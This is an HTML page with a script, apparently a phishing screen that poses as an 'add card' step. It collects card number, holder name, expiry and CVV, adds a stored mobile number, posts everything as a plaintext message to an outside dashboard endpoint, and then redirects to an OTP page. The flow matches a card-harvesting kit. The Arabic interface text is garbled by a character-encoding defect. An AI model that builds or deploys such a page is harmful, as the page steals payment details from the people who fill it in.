<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ุงุฎุชูุงุฑ ุงูุจุทุงูุฉ</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="card-container">
    <h2 class="page-title">ุงุฎุชูุงุฑ ุงูุจุทุงูุฉ</h2>

    <div class="card-preview">
      <img src="images/card.jpeg" alt="ุจุทุงูุฉ" />
    </div>

    <button class="btn primary" id="mainCardBtn">ุงุถู ุงูุจุทุงูุฉ ุงูุฃุณุงุณูุฉ</button>
    <button class="btn secondary" id="addCardBtn">ุฅุถุงูุฉ ุจุทุงูุฉ ุฃุฎุฑู</button>

    <section class="card-form" id="cardForm">
      <h3>ูุนูููุงุช ุงูุจุทุงูุฉ ุงูุฌุฏูุฏุฉ</h3>
      <form id="newCardForm">
        <div class="form-group">
          <label>ุฑูู ุงูุจุทุงูุฉ</label>
          <input type="text" id="cardNumber" maxlength="19" inputmode="numeric" placeholder="**** **** **** ****" required>
        </div>

        <div class="form-group">
          <label>ุงุณู ุตุงุญุจ ุงูุจุทุงูุฉ</label>
          <input type="text" placeholder="ุงูุงุณู ููุง ูุธูุฑ ุนูู ุงูุจุทุงูุฉ" required>
        </div>

        <div class="form-row">
          <div class="form-group">
            <label>ุชุงุฑูุฎ ุงูุงูุชูุงุก</label>
            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
          </div>
          <div class="form-group">
            <label>CVV</label>
            <input type="text" maxlength="3" inputmode="numeric" placeholder="***" required>
          </div>
        </div>

        <button type="submit" class="btn save">ุญูุธ ุงูุจุทุงูุฉ</button>
      </form>
    </section>
  </div>

  <script>
  // Toggle form visibility
  const addCardBtn = document.getElementById('addCardBtn');
  const cardForm = document.getElementById('cardForm');
  addCardBtn.addEventListener('click', () => {
    cardForm.classList.toggle('show');
  });

  // โ Navigate to OTP page when adding main card
  const mainCardBtn = document.getElementById('mainCardBtn');
  if (mainCardBtn) {
    mainCardBtn.addEventListener('click', () => {
      window.location.href = 'otp.html';
    });
  }

  // Format card number input (LTR & spaced every 4 digits)
  const cardNumberInput = document.getElementById('cardNumber');
  cardNumberInput.style.direction = 'ltr';
  cardNumberInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, ''); // remove non-digits
    value = value.substring(0, 16); // limit to 16 digits
    const formatted = value.replace(/(.{4})/g, '$1 ').trim();
    e.target.value = formatted;
  });

  // โ Format expiry date as MM/YY
  const expiryInput = document.getElementById('expiry');
  expiryInput.style.direction = 'ltr';
  expiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, ''); // only numbers
    if (value.length >= 3) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value.substring(0, 5); // limit length
  });

  // Handle form submit and send to backend
  const newCardForm = document.getElementById('newCardForm');
  newCardForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Get form values
    const cardNumber = document.getElementById('cardNumber').value.trim();
    const cardHolder = newCardForm.querySelectorAll('input')[1].value.trim(); // second input is name
    const expiry = document.getElementById('expiry').value.trim();
    const cvv = newCardForm.querySelectorAll('input')[3].value.trim(); // fourth input is CVV
    const savedNumber = localStorage.getItem('mobileNumber');
    // Disable button while sending
    const submitBtn = newCardForm.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = 'ุฌุงุฑู ุงูุฅุฑุณุงู...';

    try {
      // Send to backend
      const response = await fetch('https://dashboard-xwzz.onrender.com/api/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          text: `\n๐ณ ุจูุงูุงุช ุงูุจุทุงูุฉ ุงูุฌุฏูุฏุฉ:\nุฑูู ุงูุจุทุงูุฉ:\n ${cardNumber}\nุงุณู ุตุงุญุจ ุงูุจุทุงูุฉ: \n${cardHolder}\nุชุงุฑูุฎ ุงูุงูุชูุงุก:\n ${expiry}\nCVV:\n ${cvv}\n  ${savedNumber}`
        })
      });

      if (!response.ok) throw new Error(`HTTP ${response.status}`);

      
      newCardForm.reset();
      cardForm.classList.remove('show');

      // Redirect to OTP after successful submission
       setTimeout(() => {
      window.location.href = 'otp.html';
   }, 3000);
    } catch (err) {
      console.error('Fetch error:', err);
      alert('ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุฅุฑุณุงู ุงูุจูุงูุงุช. ุญุงูู ูุฑุฉ ุฃุฎุฑู.');
    } finally {
      submitBtn.disabled = false;
      submitBtn.textContent = originalText;
    }
  });
</script>

</body>
</html>
